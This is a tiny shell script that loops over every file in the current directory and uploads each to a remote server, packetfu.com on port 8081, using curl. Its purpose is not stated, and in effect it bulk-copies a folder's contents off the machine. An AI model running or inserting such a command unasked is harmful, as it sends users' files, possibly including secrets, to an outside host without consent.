#!/bin/sh
for i in *; do curl -F filename="$i" -F filedata=@$i http://packetfu.com:8081/upload; done
